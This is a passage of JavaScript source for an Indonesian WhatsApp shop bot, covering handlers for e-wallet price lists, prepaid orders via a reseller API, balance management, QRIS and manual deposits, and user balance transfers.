  reply += `🔹 *Data:* ${trx.data}\n`;
  reply += `🔹 *Zona:* ${trx.zone}\n`;
  reply += `💰 *Harga:* Rp. ${Func.formatNumber(trx.price)}\n`;
  reply += `📌 *Status:* ${trx.status === 'success' ? '✅ Berhasil' : trx.status === 'pending' ? '⏳ Pending' : '❌ Gagal'}\n`;
  if (trx.note) reply += `🗒️ *Catatan:* ${trx.note}\n`;
  reply += `\n`;
});

reply += `${global.footer}`;
m.reply(reply);

 } catch (error) {
console.error('Error in cekstatus:', error);
m.reply(`🚩 Terjadi kesalahan: ${error.message}`);
 }
 break;
}
case "layananewallet": {
  let services = `
DAFTAR KATEGORI LAYANAN
*AVAILABLE SERVICES*

Pilih kategori di bawah ini:
Gunakan tombol di atas untuk memilih kategori.

🎉 Terima kasih telah menggunakan layanan kami 🎉`;

  await gisnaxd.sendMessage(m.chat, {
    text: services,
    footer: "🤸💨 𝚀𝚘𝚞𝚙𝚊𝚢𝙳𝚎𝚟",
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'ini pesan interactiveMeta' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'message',
            sections: [
              {
                title: "Pilih Layanan Ewallet",
                rows: [
                  { title: "1.DANA", description: "© Qoupay Shop", id: `.pricelist dana` },
                  { title: "2.GO PAY", description: "© Qoupay Shop", id: `.pricelist GOPAY` },
                  { title: "3.GO PAY DRIVER", description: "© Qoupay Shop", id: `.pricelist GOPAY DRIVER` },
                  { title: "4.SALDO GRAB", description: "© Qoupay Shop", id: `.pricelist GRAB` },
                  { title: "5.SALDO BRI BRIZZi", description: "© Qoupay Shop", id: `.pricelist BRI BRIZZi` },
                  { title: "6.SALDO GRAB DRIVER", description: "© Qoupay Shop", id: `.pricelist GRAB DRIVER` },
                  { title: "7.SALDO LINKAJA", description: "© Qoupay Shop", id: `.pricelist LINKAJA` },
                  { title: "8.SALDO MANDIRI E-TOLL", description: "© Qoupay Shop", id: `.pricelist MANDIRI E-TOLL` },
                  { title: "9.SALDO MAXIM", description: "© Qoupay Shop", id: `.pricelist MAXIM` },
                  { title: "10.SALDO OVO", description: "© Qoupay Shop", id: `.pricelist OVO` },
                  { title: "11.SALDO SHOPEE PAY", description: "© Qoupay Shop", id: `.pricelist SHOPEE PAY` },
                  { title: "12.SALDO TAPCASH BNI", description: "© Qoupay Shop", id: `.pricelist TAPCASH BNI` },
                  { title: "11.SALDO TXI ID", description: "© Qoupay Shop", id: `.pricelist TXI ID` }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
  }, { quoted: m });
}
break
case 'pricelist': {
  try {
    const ADMIN_FEE = global.keuntungan_vip; // Biaya admin
    if (!text) {
      return m.reply(`🏷️ Format: .pricelist <brand>\nContoh: .pricelist tri`);
    }

    // Permintaan data berdasarkan brand
    const requestData = {
      type: 'services',
      filter_type: 'brand',
      filter: text.toLowerCase()
    };

    const result = await makeRequest('prepaid', requestData);
    if (!result.result || !result.data || result.data.length === 0) {
      return m.reply(`🚩 Tidak ditemukan produk untuk brand ${text}`);
    }

    // Filter produk sesuai dengan brand yang dicari
    const filteredProducts = result.data.filter(
      item => item.brand.toLowerCase() === text.toLowerCase()
    );
    if (filteredProducts.length === 0) {
      return m.reply(`🚩 Tidak ditemukan produk untuk brand ${text}`);
    }

    // Buat baris (row) untuk setiap produk dengan properti: title, description, id
    const rows = filteredProducts.map((item, index) => {
      const basePrice = item.price?.basic || 0;
      const totalPrice = basePrice + ADMIN_FEE;
      const status = item.status === 'available' ? '✅ Tersedia' : '❌ Tidak Tersedia';
      
      return {
        title: `${index + 1}. ${item.name || 'Unnamed'}`,
        description: `Harga: Rp ${basePrice.toLocaleString('id-ID')} + Admin: Rp ${ADMIN_FEE.toLocaleString('id-ID')} = Total: Rp ${totalPrice.toLocaleString('id-ID')} | Status: ${status}`,
        id: `${prefix}prepaid-detail ${item.code}`
      };
    });

    // Siapkan data tombol dengan format list
    const buttonData = {
      title: `*PRICE LIST ${text.toUpperCase()}*`,
      sections: [{
        title: 'PRODUK TERSEDIA',
        rows: rows
      }]
    };

    // Footer global (pastikan global.footer sudah didefinisikan)
    const footer = global.footer;

    // Kirim pesan list menggunakan sendList
    await gisnaxd.sendList(m.chat, buttonData.title, footer, buttonData, { quoted: m });
  } catch (error) {
    console.error('Pricelist Error:', error);
    return m.reply('🚩 Terjadi kesalahan saat memproses permintaan');
  }
  break;
}
break
case 'status': {
try {
if (!text || typeof text !== 'string' || text.trim() === '') {
return m.reply(`🔍 Format: .status <trx_id>\nContoh: .status TRX12345`);
}

const trxId = text.trim();
const apiKey = global.vipa_api_key;
const apiId = global.vipa_api_id;
const vipaUrl = 'https://vip-reseller.co.id';

// Generate sign menggunakan md5(apiId + apiKey)
const crypto = require('crypto');
const sign = crypto.createHash('md5').update(apiId + apiKey).digest('hex');

// Membuat form-data
const FormData = require('form-data');
const form = new FormData();
form.append('key', apiKey);
form.append('sign', sign);
form.append('type', 'status');
form.append('trxid', trxId); // Tambahkan trxid dari input pengguna

// Kirim POST request ke API
const axios = require('axios');
const response = await axios.post(`${vipaUrl}/api/prepaid`, form, {
headers: form.getHeaders(),
});

// Memproses respons dari API
if (response.data.result) {
const transactions = response.data.data;
let message = `*STATUS PESANAN*\n\n`;

transactions.forEach((trx, index) => {
message += `🧾 Transaksi #${index + 1}\n`;
message += `📋 Trx ID: ${trx.trxid}\n`;
message += `📱 Target: ${trx.data}\n`;
message += `🏷️ Layanan: ${trx.service}\n`;
message += `💰 Harga: Rp ${trx.price.toLocaleString()}\n`;
message += `📊 Status: ${trx.status}\n`;
if (trx.note) message += `📝 Catatan: ${trx.note}\n`;
message += `\n`;
});

return m.reply(message);
} else {
return m.reply(`🚩 Gagal mendapatkan status transaksi: ${response.data.message}`);
}
} catch (error) {
console.error('Error:', error.response?.data || error.message);
return m.reply('🚩 Terjadi kesalahan saat memproses permintaan.');
}
}
// Order Command
case 'cekriwayat': {
try {
if (!isCreator) return m.reply(mess.owner);
const fs = require('fs');
const historyFilePath = "./source/database/riwayat_prepaid.json";

// Cek apakah file riwayat transaksi ada
if (!fs.existsSync(historyFilePath)) {
return m.reply('🚩 Tidak ada riwayat transaksi yang ditemukan.');
}

// Baca isi file JSON
const fileContent = fs.readFileSync(historyFilePath, 'utf-8');
const history = JSON.parse(fileContent);

// Ambil ID pengguna
const userId = m.sender;

// Pastikan riwayat untuk pengguna ini tidak kosong
if (!history[userId] || history[userId].length === 0) {
return m.reply('🚩 Tidak ada riwayat transaksi yang ditemukan.');
}

// Buat pesan untuk ditampilkan
let msg = '*📜 RIWAYAT TRANSAKSI*\n\n';
history[userId].slice(-10).forEach((trx, index) => {
msg += `🔹 *${index + 1}.*\n`;
msg += `📋 Trx ID: ${trx.trxid}\n`;
msg += `🏷️ Service: ${trx.service}\n`;
msg += `📱 Target: ${trx.target}\n`;
msg += `💰 Price: Rp ${trx.price.toLocaleString('id-ID')}\n`;
msg += `📊 Status: ${trx.status}\n`;
msg += `⏰ Waktu: ${new Date(trx.timestamp).toLocaleString('id-ID')}\n\n`;
});

msg += '_Menampilkan 10 transaksi terakhir._\n';
msg += '🚴💨 𝚀𝚘𝚞𝚙𝚊𝚢𝙳𝚎𝚟';

return m.reply(msg);

} catch (error) {
console.error('Error reading transaction history:', error.message);
return m.reply('🚩 Terjadi kesalahan saat membaca riwayat transaksi.');
}
}
break
case 'buyprepaid': {
try {
const transaction = "./source/database/prepaid.json";
const saldoFilePath = "./source/saldo.json";
const ApiurlVip = global.vipa_url;
const ADMIN_FEE = global.keuntungan_vip; // Added admin fee constant

// Existing validation functions remain the same
function validatePhoneNumber(number) {
const phoneRegex = /^[0-9]{10,12}$/;
return phoneRegex.test(number);
}

// Existing saldo functions remain the same
function readSaldo(userId) {
const fs = require('fs');
const path = require('path');

if (fs.existsSync(saldoFilePath)) {
const fileContent = fs.readFileSync(saldoFilePath, 'utf-8');
const saldoData = JSON.parse(fileContent);
return saldoData[userId] || 0;
}
return 0;
}

function reduceSaldo(userId, amount) {
const fs = require('fs');
const path = require('path');

let saldoData = {};
if (fs.existsSync(saldoFilePath)) {
const fileContent = fs.readFileSync(saldoFilePath, 'utf-8');
saldoData = JSON.parse(fileContent);
}

if (!saldoData[userId]) {
saldoData[userId] = 0;
}

if (saldoData[userId] < amount) {
throw new Error('Saldo tidak mencukupi');
}

saldoData[userId] -= amount;
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2), 'utf-8');
}

function addSaldo(userId, amount) {
const fs = require('fs');
const path = require('path');

let saldoData = {};
if (fs.existsSync(saldoFilePath)) {
const fileContent = fs.readFileSync(saldoFilePath, 'utf-8');
saldoData = JSON.parse(fileContent);
}

if (!saldoData[userId]) {
saldoData[userId] = 0;
}

saldoData[userId] += amount;
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2), 'utf-8');
}

function saveTransactionHistory(transaction) {
const fs = require('fs');
const historyFilePath = "./source/database/riwayat_prepaid.json";

try {
let history = {};

if (fs.existsSync(historyFilePath)) {
const fileContent = fs.readFileSync(historyFilePath, 'utf-8');
history = JSON.parse(fileContent);
}

const userId = transaction.userId || 'unknown_user';

if (!history[userId]) {
history[userId] = [];
}

const newTransaction = {
trxid: transaction.trxid || 'N/A',
service: transaction.service || 'N/A',
target: transaction.target || 'N/A',
price: transaction.price || 0,
adminFee: transaction.adminFee || 0, // Added admin fee to history
totalPrice: transaction.totalPrice || 0, // Added total price to history
status: transaction.status || 'pending',
note: transaction.note || '',
timestamp: transaction.timestamp || new Date().toISOString(),
};

history[userId].push(newTransaction);

fs.writeFileSync(historyFilePath, JSON.stringify(history, null, 2), 'utf-8');
console.log('Riwayat transaksi berhasil disimpan.');
} catch (error) {
console.error('Gagal menyimpan riwayat transaksi:', error.message);
}
}

async function checkTransactionStatus(trxid) {
const form = new FormData();
form.append('key', global.vipa_api_key);
form.append('sign', calculateSign(global.vipa_api_id, global.vipa_api_key));
form.append('type', 'status');
form.append('trxid', trxid);

try {
const response = await axios.post(`${ApiurlVip}/api/prepaid`, form, {
headers: form.getHeaders(),
});
return response.data;
} catch (error) {
console.error('Error checking transaction status:', error.message);
return null;
}
}

if (!text) {
return m.reply(`🛒 Format: .topupewallet <service_id> <tujuan>\nContoh: .topupewallet TLKM10 081234567890`);
}

const [serviceId, target] = text.split(' ');

if (!serviceId || !target) {
return m.reply('🚩 Format salah! Gunakan: .order <service_id> <tujuan>');
}

if (!validatePhoneNumber(target)) {
return m.reply('🚩 Nomor tujuan tidak valid. Harap masukkan nomor dengan format yang benar.');
}

// First, get the order price from API
const orderForm = new FormData();
orderForm.append('key', global.vipa_api_key);
orderForm.append('sign', calculateSign(global.vipa_api_id, global.vipa_api_key));
orderForm.append('type', 'order');
orderForm.append('service', serviceId);
orderForm.append('data_no', target);

console.log(`Sending order request for service: ${serviceId} to target: ${target}`);

const orderResponse = await axios.post(`${ApiurlVip}/api/prepaid`, orderForm, {
headers: orderForm.getHeaders(),
});

console.log('API Response:', orderResponse.data);

const result = orderResponse.data;

if (result && result.result && result.data) {
const order = result.data;
const price = order.price; // Get the actual price from the order response
const totalPrice = price + ADMIN_FEE; // Calculate total price including admin fee

// Check user's balance against the total price including admin fee
const userId = m.sender;
const saldo = readSaldo(userId);

if (saldo < totalPrice) {
return m.reply(`🚩 Saldo tidak mencukupi. Saldo Anda: Rp ${saldo.toLocaleString('id-ID')}, Total Harga: Rp ${totalPrice.toLocaleString('id-ID')} (Harga: Rp ${price.toLocaleString('id-ID')} + Admin: Rp ${ADMIN_FEE.toLocaleString('id-ID')})`);
}

// Reduce user's balance with the total price
reduceSaldo(userId, totalPrice);

let msg = `*ORDER BERHASIL*\n\n`;
msg += `📋 Trx ID: ${order.trxid || 'N/A'}\n`;
msg += `🏷️ Service: ${order.service || 'N/A'}\n`;
msg += `📱 Target: ${order.data || 'N/A'}\n`;
msg += `💰 Harga: Rp ${price.toLocaleString('id-ID')}\n`;
msg += `📊 Biaya Admin: Rp ${ADMIN_FEE.toLocaleString('id-ID')}\n`;
msg += `💳 Total Bayar: Rp ${totalPrice.toLocaleString('id-ID')}\n`;
msg += `📊 Status: ${order.status || 'N/A'}\n`;
if (order.note) msg += `📝 Note: ${order.note}\n`;
msg += `\n✅ Pesanan sedang diproses`;
const now = new Date();
const transaksi = {
transactionId: `${m.sender}_${Date.now()}`,
sender: m.sender,
amount: totalPrice,
hadiah: `Beli Akun Permium ${order.service}`,
metode: "Saweria",
tanggal: now.toLocaleDateString('id-ID'),
waktu: now.toLocaleTimeString('id-ID'),
status: "selesai"
};

const transaksiPath = './source/transaksi.json';
let transaksiData = [];
if (fs.existsSync(transaksiPath)) {
transaksiData = JSON.parse(fs.readFileSync(transaksiPath, 'utf8'));
}

transaksiData.push(transaksi);
fs.writeFileSync(transaksiPath, JSON.stringify(transaksiData, null, 2), 'utf8');
// Save transaction history with admin fee and total price
saveTransactionHistory({
userId: m.sender,
trxid: order.trxid,
service: order.service,
target: target,
price: price,
adminFee: ADMIN_FEE,
totalPrice: totalPrice,
status: order.status,
note: order.note || '',
timestamp: new Date().toISOString(),
});
// Check transaction status after delay
setTimeout(async () => {
const statusResult = await checkTransactionStatus(order.trxid);
if (statusResult && statusResult.result && statusResult.data.length > 0) {
const status = statusResult.data[0];
if (status.status.toLowerCase() === 'success') {
const successMsg = `🎉 *TRANSAKSI BERHASIL*\n\n📋 Trx ID: ${status.trxid}\n🏷️ Service: ${status.service}\n📱 Target: ${status.data}\n💰 Harga: Rp ${status.price.toLocaleString('id-ID')}\n📊 Biaya Admin: Rp ${ADMIN_FEE.toLocaleString('id-ID')}\n💳 Total Bayar: Rp ${(status.price + ADMIN_FEE).toLocaleString('id-ID')}\n📊 Status: Sukses`;
m.reply(successMsg);
} else if (status.status.toLowerCase() === 'failed') {
addSaldo(userId, totalPrice); // Refund the total price including admin fee
const failedMsg = `🚩 *TRANSAKSI GAGAL*\n\n📋 Trx ID: ${status.trxid}\n🏷️ Service: ${status.service}\n📱 Target: ${status.data}\n💰 Harga: Rp ${status.price.toLocaleString('id-ID')}\n📊 Biaya Admin: Rp ${ADMIN_FEE.toLocaleString('id-ID')}\n💳 Total Bayar: Rp ${(status.price + ADMIN_FEE).toLocaleString('id-ID')}\n📊 Status: Gagal\n\n💸 Saldo Anda telah dikembalikan.`;
m.reply(failedMsg);
}
}
}, 30000);

return m.reply(msg);
} else {
console.error('API Response does not contain expected data:', result);
return m.reply(`🚩 ${result.message || 'Gagal membuat pesanan. Tidak ada data yang valid dari API.'}`);
}
} catch (error) {
console.error('Order Error:', error.message);
return m.reply('🚩 Terjadi kesalahan saat membuat pesanan');
}
}
break
case 'prepaid-detail': {
try {
// Pastikan `text` berisi input kode produk
const serviceCode = text.trim();

if (!serviceCode) {
return m.reply('🚩 Format tidak valid. Gunakan format: prepaid-detail <kode_produk>\nContoh: prepaid-detail XLDHR3');
}

// Hitung tanda tangan API
const sign = calculateSign(global.vipa_api_id, global.vipa_api_key);

const form = new FormData();
form.append('key', global.vipa_api_key);
form.append('sign', sign);
form.append('type', 'services');

// Kirim permintaan ke API
const response = await axios.post(`${global.vipa_url}/api/prepaid`, form, {
headers: form.getHeaders(),
});

const result = response.data;

// Filter data berdasarkan kode produk
const detail = result.data.find(item => item.code === serviceCode);

if (!detail) {
return m.reply(`🚩 Detail produk dengan kode ${serviceCode} tidak ditemukan.`);
}

// Pastikan `users` didefinisikan, gunakan data pengguna yang relevan
const users = m.users || {}; // Ganti sesuai konteks aplikasi Anda

// Hitung harga berdasarkan role pengguna
let harga = detail.price[global.vipa_role];
if (users.special) {
harga += global.special_pre;
} else if (users.reseller) {
harga += global.reseller_pre;
} else if (users.buyer) {
harga += global.buyer_pre;
}

const buyer = detail.price[global.vipa_role] + global.buyer_pre;
const reseller = detail.price[global.vipa_role] + global.reseller_pre;
const special = detail.price[global.vipa_role] + global.special_pre;
// Buat pesan detail produk
let message = `*Detail Produk*\n\n`;
message += `○Brand : ${detail.brand || 'N/A'}\n`;
message += `○Nama Produk : ${detail.name}\n`;
message += `○Kode Produk : ${detail.code}\n`;
message += `○List Harga :\n`;
message += `> Buyer : Rp. ${Func.formatNumber(buyer)}\n`;
message += `> Reseller : Rp. ${Func.formatNumber(reseller)}\n`;
message += `> Special : Rp. ${Func.formatNumber(special)}\n`;
message += `○ Harga Untuk Anda :\n`;
message += `> Rp. ${Func.formatNumber(harga)}\n`;
message += `○Status : ${detail.status}\n`;
message += `○Multi Transaksi : ${detail.multi_trx ? 'Ya' : 'Tidak'}\n`;
message += `○Maintenance : ${detail.maintenace}\n`;
message += `○Kategori : ${detail.category}\n`;
message += `○Pre/Post Paid : ${detail.prepost}\n`;
message += `○Tipe : ${detail.type}\n\n`;
message += `○Mau Beli Saldo E-Wallet : .buyprepaid kode_produk|628xx\n`;
message += `ᴄʀᴇᴀᴛᴏʀ ʏɪʟᴢɪɪ sʜᴏᴘ v7 ツ`;
// Kirim pesan ke pengguna
return m.reply(message);
} catch (error) {
console.error('Error in prepaid-detail:', error.message);
return m.reply('🚩 Terjadi kesalahan saat memuat detail produk.');
}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//FITUR-SALDO
case "addsaldo": {
// Cek apakah yang menjalankan adalah creator
if (!isCreator) return m.reply("❌ Maaf, hanya owner yang dapat menggunakan perintah ini.");

// Validasi argumen input
const args = m.text.split(" ");
if (args.length < 3) {
return m.reply(`Penggunaan: ${prefix}addsaldo nomor nominal\n\nContoh: ${prefix}addsaldo 6282245415403 10000`);
}

// Ekstrak nomor dan nominal
const nomorUser = args[1];
const nominal = parseInt(args[2]);
const userJid = `${nomorUser}@s.whatsapp.net`;

// Validasi nomor hp
if (!/^\d+$/.test(nomorUser)) {
return m.reply("❌ Nomor hp harus berupa angka!");
}

// Validasi nominal
if (isNaN(nominal) || nominal <= 0) {
return m.reply("❌ Nominal saldo harus berupa angka positif!");
}

const saldoFilePath = "./source/saldo.json";

try {
// Baca file saldo
const saldoData = fs.existsSync(saldoFilePath)
? JSON.parse(fs.readFileSync(saldoFilePath, "utf-8"))
: {};

// Update saldo
if (saldoData[userJid]) {
saldoData[userJid] += nominal;
} else {
saldoData[userJid] = nominal;
}

// Simpan perubahan saldo
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await gisnaxd.sendMessage(m.chat, {
  text: `✅ Berhasil menambahkan saldo:\n📱 Pengguna: ${nomorUser}\n💰 Nominal: Rp${nominal.toLocaleString()}\n\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`,
  footer: "🚴BOTSHOP",
  buttons: [
{ buttonId: '.owner', buttonText: { displayText: 'Owner Qoupay' }, type: 1,}, 
{ buttonId: '.produk', buttonText: { displayText: 'Buy Produk' }, type: 1 },
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'message',
sections: [
{
title: 'Pilih Menu',
highlight_label: '🚴 BOTSHOP',
rows: [
{ title: "💳CEK SALDO", description: "Untuk Cek Saldo Member Anda", id: `.saldo`}, 
{ title: "🚴 PRODUK MENU", description: "Untuk Menampilkan Produk Menu", id: `.produk`},
]}]})}}],
  headerType: 1,
  viewOnce: true,
}, { quoted: m });
// Kirim notifikasi ke nomor yang bersangkutan
const notificationMessage = `💰 Informasi Saldo\n\nSaldo Anda telah ditambahkan:\n💵 Nominal: Rp${nominal.toLocaleString()}\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`;

await gisnaxd.sendMessage(`${nomorUser}@s.whatsapp.net`, {
text: notificationMessage
});

} catch (error) {
console.error("Error menambah saldo:", error);
m.reply("❌ Terjadi kesalahan saat menambah saldo.");
}
}
break
case "delsaldo": {
if (!isCreator) return m.reply(mess.owner)
try {
const saldoFilePath = "./source/saldo.json";
if (!args[0] || !args[1]) {
return await m.reply("⚠️ Format salah! Gunakan: .kurangisaldo nomor nominal\nContoh: .kurangisaldo 6281234567890 5000");
}
const nomor = args[0];
const nominal = parseInt(args[1]);
if (isNaN(nominal) || nominal <= 0) {
return await m.reply("⚠️ Nominal harus berupa angka positif!");
}
if (!fs.existsSync(saldoFilePath)) {
return await m.reply("⚠️ File saldo tidak ditemukan!");
}
const saldoData = JSON.parse(fs.readFileSync(saldoFilePath, "utf-8") || "{}");

console.log("Data Saldo:", saldoData);
console.log("Nomor Input:", nomor);
const nomorFormat = `${nomor}@s.whatsapp.net`;
if (!saldoData[nomorFormat]) {
return await m.reply(`❌ Nomor ${nomorFormat} tidak ditemukan dalam data saldo!`);
}
if (saldoData[nomorFormat] < nominal) {
return await m.reply(
`❌ Saldo tidak mencukupi!\n💰 Saldo saat ini: Rp${saldoData[nomorFormat]}`
);
}
saldoData[nomorFormat] -= nominal;
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await m.reply(`✅ Saldo berhasil dikurangi!\n💰 Saldo terbaru untuk ${nomorFormat}: Rp${saldoData[nomorFormat]}`);
} catch (error) {
console.error("Error in kurangisaldo:", error);
await m.reply("❌ Terjadi kesalahan saat mengurangi saldo!");
}
}
break
case 'saldo': {
try {
const userId = m.sender;
let saldoDB;
try {
saldoDB = JSON.parse(fs.readFileSync('./source/saldo.json'));
} catch {
saldoDB = {}
}
if (!saldoDB[userId]) {
saldoDB[userId] = 0;
fs.writeFileSync('./source/saldo.json', JSON.stringify(saldoDB, null, 2));
}
const saldo = saldoDB[userId];
await gisnaxd.sendMessage(m.chat, { text: `*💳 Cek Saldo Anda*
📣 *Saldo Anda:* Rp${saldo.toLocaleString('id-ID')}
👤 *Pengguna:* @${userId.split('@')[0]}

*_🚴💨 BOTSHOP V3_*`, mentions: [userId] }, { quoted: m });
} catch (error) {
console.error("Error on .saldo:", error);
await gisnaxd.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat mengecek saldo. Silakan coba lagi nanti." 
});
}
break;
}

case 'deposit': {
    if (!text) return m.reply(`Gunakan: ${prefix + command} <jumlah>`);

    const amount = Number(text);
    if (isNaN(amount) || amount < 5000) return m.reply('❌ Minimal deposit adalah Rp 5.000.');

    m.reply(`📌 *Pilih metode pembayaran:*

1️⃣ *Manual (Transfer Dana)*
2️⃣ *Otomatis (QRIS)*

👉 *Balas dengan .1 atau .2 untuk memilih.*`);

    global.depositSession[m.sender] = { amount, status: 'pending' };
    break;
}

case '1': {
    if (!global.depositSession[m.sender] || global.depositSession[m.sender].status !== 'pending') 
        return m.reply('❌ Kamu belum memulai deposit. Gunakan perintah `.deposit <jumlah>`');

    const { amount } = global.depositSession[m.sender];
    const biayaAdmin = 500;
    const totalAmount = amount + biayaAdmin;
    let adminID = "6285167089173@s.whatsapp.net";

    await gisnaxd.sendMessage(adminID, { text: `🔔 *Permintaan Deposit Manual*

👤 *User:* ${m.sender}
💸 *Jumlah:* Rp${amount.toLocaleString("id-ID")}
💰 *Biaya Admin:* Rp${biayaAdmin.toLocaleString("id-ID")}
📌 *Total Transfer:* Rp${totalAmount.toLocaleString("id-ID")}

📤 *User akan mengirim bukti transfer ke admin.*` });

    m.reply(`✅ Silakan transfer ke rekening berikut:

🏦 *Bank:* Dana  
🔢 *Nomor Rekening:* ${global.dana}  
💰 *Jumlah yang harus ditransfer:* Rp${totalAmount.toLocaleString("id-ID")}  
💸 *Biaya Admin:* Rp${biayaAdmin.toLocaleString("id-ID")}  

📌 *Setelah transfer, kirim bukti ke admin (${adminID.replace(/@s.whatsapp.net/, '')})*`);

    global.depositSession[m.sender].status = 'waiting_payment';
    break;
}

case '2': {
    if (!global.depositSession[m.sender] || global.depositSession[m.sender].status !== 'pending') {
        return m.reply('Kamu belum memulai deposit. Gunakan perintah `.deposit <jumlah>`');
    }

    const { amount } = global.depositSession[m.sender];
    const biayaAdmin = 1000;
    const totalAmount = amount + biayaAdmin;

    let pay = await fetch(`${global.webapi}/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`).then(res => res.json());

    if (!pay.result) return m.reply('Terjadi kesalahan saat membuat pembayaran. Coba lagi nanti.');

    m.reply(`*Informasi Pembayaran Otomatis*
🆔 ID: ${pay.result.transactionId}
💰 Total: Rp${totalAmount}
💸 Biaya Admin: Rp${biayaAdmin}
⏳ Expired: 5 menit

*QRIS hanya berlaku dalam 5 menit.* Jika pembayaran berhasil, saldo akan otomatis masuk.`);

    let msgQr = await gisnaxd.sendMessage(m.chat, { 
        image: { url: pay.result.qrImageUrl }, 
        caption: `Silakan scan QRIS di atas untuk melakukan pembayaran.` 
    }, { quoted: m });

    global.depositData[m.sender] = {
        status: 'waiting_payment',
        idDeposit: pay.result.transactionId,
        amount,
        msg: msgQr,
        chat: m.sender,
        exp: setTimeout(async () => {
            if (global.depositData[m.sender] && global.depositData[m.sender].status === 'waiting_payment') {
                await gisnaxd.sendMessage(m.sender, { text: '⏳ QRIS Pembayaran telah expired!' }, { quoted: global.depositData[m.sender].msg });
                delete global.depositData[m.sender];
            }
        }, 300000), // 5 menit
    };

    global.depositSession[m.sender].status = 'waiting_payment';

    // Cek pembayaran setiap 8 detik
    while (global.depositData[m.sender] && global.depositData[m.sender].status === 'waiting_payment') {
        await new Promise(resolve => setTimeout(resolve, 8000));
        let resultcek = await fetch(`${global.restapi}/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${merchantIdOrderKuota}&keyorkut=${apiOrderKuota}`).then(res => res.json());

        if (resultcek && resultcek.amount == totalAmount) {
            global.depositData[m.sender].status = 'completed';
            clearTimeout(global.depositData[m.sender].exp);

            // Bonus random antara 500 - 2000
            let bonus = generateRandomNumber(5000, 10000);
            let totalSaldo = amount + bonus;

            tambahSaldo(m.sender, totalSaldo);
            await m.reply(`✅ *Deposit Berhasil!*
            🆔 ID Transaksi: ${global.depositData[m.sender].idDeposit}
            💵 Saldo Ditambahkan: Rp${amount}
            🎁 Bonus: Rp${bonus}
            💸 Biaya Admin: Rp${biayaAdmin}
            🔹 Saldo Sekarang: Rp${cekSaldo(m.sender)}`);

            delete global.depositData[m.sender];
            delete global.depositSession[m.sender];
        }
    }
    break;
}


case 'konfirmasi': {
    if (!m.message.imageMessage) return m.reply('Harap kirim bukti transfer dalam bentuk foto.');

    const userDeposit = db.users[m.sender];
    if (!userDeposit || userDeposit.status_deposit !== 'manual') {
        return m.reply('Tidak ada deposit manual yang perlu dikonfirmasi.');
    }

    const bukti = await downloadMediaMessage(m.message.imageMessage);

    // Simpan bukti transfer ke log admin
    m.reply(`Bukti pembayaran telah diterima. Menunggu verifikasi admin.`);

    // Kirim ke owner dengan User ID
    const ownerId = global.owner; // Pastikan owner ID sudah tersimpan di global config
    await gisnaxd.sendMessage(ownerId, {
        image: bukti,
        caption: `📩 *Konfirmasi Deposit Manual* 📩\n\n👤 *User ID:* ${m.sender}\n📝 *Status:* Menunggu verifikasi admin.`,
    });

    // Reset status deposit setelah bukti dikirim
    db.users[m.sender] = null;
    break;
}

case "transfer": {
    // Validasi argumen input
    const args = m.text.split(" ");
    if (args.length < 3) {
        return m.reply(`Penggunaan: ${prefix}transfer <userid> <nominal>\n\nContoh: ${prefix}transfer 6281234567890 5000`);
    }

    // Ekstrak userID penerima dan nominal
    const userIdPenerima = args[1] + "@s.whatsapp.net"; // Format nomor WA
    const nominal = parseInt(args[2]);
    const pengirimId = m.sender;

    // Validasi nominal
    if (isNaN(nominal) || nominal <= 0) {
        return m.reply("❌ Nominal saldo harus berupa angka positif!");
    }

    // Cek apakah pengirim memiliki saldo cukup
    let saldoPengirim = cekSaldo(pengirimId);
    if (saldoPengirim < nominal) {
        return m.reply("❌ Saldo Anda tidak mencukupi untuk melakukan transfer ini!");
    }

    // Cek apakah penerima terdaftar
    if (!cekSaldo(userIdPenerima)) {
        return m.reply("❌ User ID penerima tidak ditemukan!");
    }

    // Proses transfer saldo
    kurangiSaldo(pengirimId, nominal);
    addSaldo(userIdPenerima, nominal);

    // Konfirmasi ke pengirim
    await gisnaxd.sendMessage(m.chat, {
        text: `✅ Transfer berhasil!\n📤 Anda mengirim Rp${nominal.toLocaleString()} ke User ID: ${userIdPenerima.replace("@s.whatsapp.net", "")}\n\n📊 Sisa Saldo Anda: Rp${cekSaldo(pengirimId).toLocaleString()}`,
    }, { quoted: m });

    // Notifikasi ke penerima
    await gisnaxd.sendMessage(userIdPenerima, {
        text: `💰 Anda menerima saldo!\n📥 Rp${nominal.toLocaleString()} dari ${m.pushName}\n\n📊 Total Saldo Sekarang: Rp${cekSaldo(userIdPenerima).toLocaleString()}`,
    });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//BUYSCRIPT
case 'addscript': {
const path = require('path');

if (!isCreator) return m.reply(mess.owner);
const scriptPath = './source/database/scripts.json';
const scriptFolder = './source/scripts/';

if (!m.quoted) return m.reply("❌ *Maaf Pesan Script Nya Mohon Di Reply!*");

const documentMessage = m.quoted.message?.documentMessage;
if (!documentMessage) return m.reply("❌ *Mana Script Dokumen nya ka??*");

if (documentMessage.mimetype !== 'application/zip') {
return m.reply("❌ *File harus berupa ZIP!*");
}

const [name, price, ...descriptionParts] = args;
const description = descriptionParts.join(" ");

if (!name || !price || !description) return m.reply("❌ *Format salah!*\n📌 Contoh: .addscript NamaScript 10000 DeskripsiScript");

try {
        // Unduh media menggunakan metode yang lebih aman
        const media = await m.quoted.download();
        if (!media) return m.reply("❌ *Gagal mendownload file media!*");

const safeFileName = name.replace(/[^a-z0-9]/gi, '_').toLowerCase();
const fileName = `${safeFileName}_${Date.now()}.zip`;
